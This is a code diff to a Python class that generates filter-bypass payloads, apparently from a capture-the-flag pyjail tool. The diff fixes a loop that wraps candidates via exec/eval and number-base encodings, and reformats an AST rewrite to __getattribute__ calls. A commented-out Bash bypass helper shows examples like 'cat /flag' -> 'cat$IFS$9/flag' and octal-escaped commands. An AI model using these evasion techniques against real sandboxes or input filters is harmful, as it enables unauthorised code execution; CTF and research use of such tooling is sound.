@@ -252,31 +252,32 @@ class BypassGenerator:
         for i in output:
             if not is_blacklisted(i):
                 return output  # in case of the challenge is easy
+        tmp = copy(output)
         if self._allow_after_tagging_bypassers:
-
-            output.append(self.numbers_to_binary_base(i))
-            output.append(self.numbers_to_hex_base(i))
-            output.append(self.numbers_to_oct_base(i))
-            if self.find_object(exec, self.local_scope):
-                output.extend(
-                    BypassGenerator(
-                        [self.repr_to_exec(i), {}],
-                        self.allow_unicode_bypass,
-                        self.local_scope,
-                        _allow_after_tagging_bypassers=False,
-                        search_depth=self.search_depth // 2,
-                    ).generate_bypasses()
-                )
-            if self.find_object(eval, self.local_scope):
-                output.extend(
-                    BypassGenerator(
-                        [self.repr_to_eval(i), {}],
-                        self.allow_unicode_bypass,
-                        self.local_scope,
-                        _allow_after_tagging_bypassers=False,
-                        search_depth=self.search_depth // 2,
-                    ).generate_bypasses()
-                )
+            for i in tmp:
+                output.append(self.numbers_to_binary_base(i))
+                output.append(self.numbers_to_hex_base(i))
+                output.append(self.numbers_to_oct_base(i))
+                if self.find_object(exec, self.local_scope):
+                    output.extend(
+                        BypassGenerator(
+                            [self.repr_to_exec(i), {}],
+                            self.allow_unicode_bypass,
+                            self.local_scope,
+                            _allow_after_tagging_bypassers=False,
+                            search_depth=self.search_depth // 2,
+                        ).generate_bypasses()
+                    )
+                if self.find_object(eval, self.local_scope):
+                    output.extend(
+                        BypassGenerator(
+                            [self.repr_to_eval(i), {}],
+                            self.allow_unicode_bypass,
+                            self.local_scope,
+                            _allow_after_tagging_bypassers=False,
+                            search_depth=self.search_depth // 2,
+                        ).generate_bypasses()
+                    )
         output = remove_duplicate(output)
         return output
 
@@ -1301,7 +1302,9 @@ class BypassGenerator:
             def visit_Attribute(self, node):
                 return ast.Call(
                     func=ast.Attribute(
-                        value=self.visit(node.value), attr="__getattribute__", ctx=ast.Load()
+                        value=self.visit(node.value),
+                        attr="__getattribute__",
+                        ctx=ast.Load(),
                     ),
                     args=[ast.Constant(value=node.attr)],
                     keywords=[],
@@ -1313,11 +1316,11 @@ class BypassGenerator:
         return ast.unparse(transformed_tree)
 
 
-# To be completed
+# TO BE CONTINUED
 # class BashBypassGenerator:
 #     """
 #     Bypasser only for RCE bash commands.
-#     'cat /flag' -> 'cat$IFS$9/*'
+#     'cat /flag' -> 'cat$IFS$9/flag'
 #     """
 #     def blank_to_ifs(self, payload: str) -> str:
 #         """
@@ -1333,12 +1336,12 @@ class BypassGenerator:
 #         return (oct(ord(c)))[2:]
 
 
-#     # def nomal_otc(cmd):  # 注意,该方法无法执行带参数命令,如:ls -l
-#     #     payload = '$\''
-#     #     for c in cmd:
-#     #         payload += '\\' + get_oct(c)
-#     #     payload += '\''
-#     #     return info(payload)
+#     def nomal_otc(self, cmd):  # 注意,该方法无法执行带参数命令,如:ls -l
+#         payload = '$\''
+#         for c in cmd:
+#             payload += '\\' + self.get_oct(c)
+#         payload += '\''
+#         return payload
 
 #     def common_otc(self, cmd):
 #         payload = '$\''
@@ -1405,7 +1408,7 @@ class BypassGenerator:
 #         print(self.bashfuck_y(cmd))
 
 
-#     def main():
+#     def main(self):
 #         print("This program is used to generate Payload for Bash to execute the given command. The program uses Bash's arithmetic and parameter extension capabilities to generate different forms of Payload to improve the chance of Bypass.")
 #         print("Author: Github@Probius_Official")
 #         cmd = input("input your command:")
